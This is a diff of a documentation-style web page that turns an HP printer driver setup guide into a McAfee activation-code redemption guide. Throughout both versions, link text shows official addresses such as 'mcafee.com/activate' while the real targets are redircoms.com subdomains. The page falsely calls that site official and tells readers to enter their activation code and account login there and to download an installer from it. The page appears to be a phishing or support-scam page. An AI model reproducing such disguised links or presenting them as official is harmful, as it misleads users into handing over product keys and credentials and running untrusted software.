@@ -1,21 +1,21 @@
 ##################
-How Do I Download, Install, and Set Up My HP Printer Driver?
+How to redeem McAfee activation code?
 ##################
 
 .. meta::
-   :msvalidate.01: 108BF3BCC1EC90CA1EBEFF8001FAEFEA
+   :msvalidate.01: 98C899EEC245D9CBFD6A1AD132F06457
 
 .. image:: blank.png
       :width: 350px
       :align: center
       :height: 100px
 
-.. image:: Enter_Product_Key.png
+.. image:: ENTER-ACTIVATION-CODE-BUTTON.png
       :width: 350px
       :align: center
       :height: 100px
-      :alt: hp.com/setup
-      :target: https://hp.redircoms.com
+      :alt: mcafee.com/activate
+      :target: https://mc.redircoms.com
 
 .. image:: blank.png
       :width: 350px
@@ -28,46 +28,33 @@ How Do I Download, Install, and Set Up My HP Printer Driver?
 
 
 
-There are 5 simple stages to download, install, and set up your HP printer driver on your computer. Follow each stage one by one to successfully connect your printer via `hp.com/setup <https://hp.redircoms.com>`_. HP’s setup site provides the latest drivers and simple installation steps. It’s the fastest way to ensure your printer works seamlessly with your computer. Visit `hp.com/setup <https://hp.redircoms.com>`_, download the right driver, and get your printer ready to use in minutes.
+If you’ve purchased a McAfee security product and need to activate it, the process begins at `mcafee.com/activate <https://mc.redircoms.com>`_. This is the official site where you can redeem your **McAfee activation code**, link the product to your account, and install the necessary software on your device.
 
-**********
-Steps to Download HP Printer Driver
-**********
+Where to Find Your McAfee Activation Code
+------------------------------------------
 
-1. Open a web browser and go to `hp.com/setup <https://hp.redircoms.com>`_.
+The **McAfee activation code** is a 25-character alphanumeric key. You can find it:
+- On the retail card inside your product box,
+- In the confirmation email (for online purchases),
+- Or directly from the online retailer’s purchase page.
 
-2. Enter your HP printer model in the search box.
+Make sure to have this key available before starting the activation process.
 
-3. Select your operating system if prompted.
+Steps to Redeem McAfee Activation Code
+---------------------------------------
 
-4. Click on **Download** to get the latest driver and software package.
+1. Open a web browser and go to `mcafee.com/activate <https://mc.redircoms.com>`_.
+2. Sign in with your McAfee account or create a new one if needed.
+3. Enter your **McAfee activation code** into the field provided.
+4. Click **Submit** or **Next** to validate the code.
+5. After successful validation, download the McAfee installer.
+6. Run the installer and follow the on-screen prompts to complete the setup.
+7. Once installed, your McAfee product will be activated and ready to protect your device.
 
-5. Save the installer file to your computer.
+Why Activation Is Important
+-----------------------------
 
-**********
-Steps to Install HP Printer Driver
-**********
-
-1. Locate the downloaded installer file on your computer.
-
-2. Double-click the installer to begin the setup process.
-
-3. Follow the on-screen instructions and accept the license agreement.
-
-4. Choose your connection type (USB or Wireless).
-
-5. Complete the installation by clicking **Finish**.
-
-**********
-Setting Up Your HP Printer
-**********
-
-1. Make sure your HP printer is powered on.
-
-2. For wireless setup, ensure your printer and computer are on the same Wi-Fi network.
-
-3. Open the HP driver or utility you installed.
-
-4. Follow on-screen prompts to detect and connect your printer.
-
-5. Once connected, print a test page to verify setup is complete.
+Redeeming your McAfee activation code ensures that:
+- Your subscription is active and linked to your account,
+- Your device is fully protected with the latest updates,
+- You can manage or renew your plan easily through your account dashboard.
